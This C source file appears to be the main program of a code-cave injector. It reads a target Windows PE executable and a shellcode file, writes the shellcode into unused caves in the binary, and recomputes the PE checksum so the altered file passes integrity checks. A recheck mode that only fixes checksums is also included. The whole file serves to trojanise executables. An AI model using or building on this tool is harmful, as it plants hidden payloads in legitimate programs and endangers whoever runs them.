#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "../lib/custom_io.h"
#include "../lib/inject.h"
#include "../lib/map.h"
#include "../lib/PE.h"
#include "../lib/DOS.h"
#include "../lib/custom_io_pe.h"

char *target;
char *shellcode;
char *output;

int main(int argc , char **argv){
	basic_map *args = mapCreate_fromParams(argc, argv);
	if(!args)
		return 1;

	if(_mapKeyExist(args, "-recheck")){
	PE_STRUCTURE *pe = loadPE(mapKeyLookup(args, "-target"));
	long chksum = pe_checksum(pe);
	printf("Target Checksum:\t0x%X\n",pe->image_nt_header->image_optional_header.checkSum);
	printf("Calculated Checksum:\t0x%lX\n",chksum);
	pe->image_nt_header->image_optional_header.checkSum = chksum;
	bufferToFile(pe->buffer, pe->size, mapKeyLookup(args, "-target"));
	free(pe->buffer);
	free(pe);
	mapDestroy(args);
	return 0;
	}

	if(_mapKeyExist(args, "-inject")){
		target = mapKeyLookup(args, "-target");
		shellcode = mapKeyLookup(args, "-shellcode");
		output = mapKeyLookup(args, "-output");

		printf("Target: %s\nShellcode: %s\nOutput: %s\n",target,shellcode,output);
		compound_file *cf_target = fileToBuffer(target);
		compound_file *cf_shellcode = fileToBuffer(shellcode);

		cavelist *cl = getCaves(cf_target);
		injectShellcode(cl, cf_target, cf_shellcode);
		freeCaves(cl);

		PE_STRUCTURE *pe = loadPE_fromCompoundFile(cf_target);
		long chksum = pe_checksum(pe);
		printf("Target Checksum:\t0x%X\n",pe->image_nt_header->image_optional_header.checkSum);
		printf("Calculated Checksum:\t0x%lX\n",chksum);

		pe->image_nt_header->image_optional_header.checkSum = chksum;

		compoundFileToFile(cf_target, output);
		destroyCompoundFile(cf_shellcode);
		destroyCompoundFile(cf_target);
		free(pe);
		mapDestroy(args);
		return 0;
	}


	mapDestroy(args);
	return 0;
}
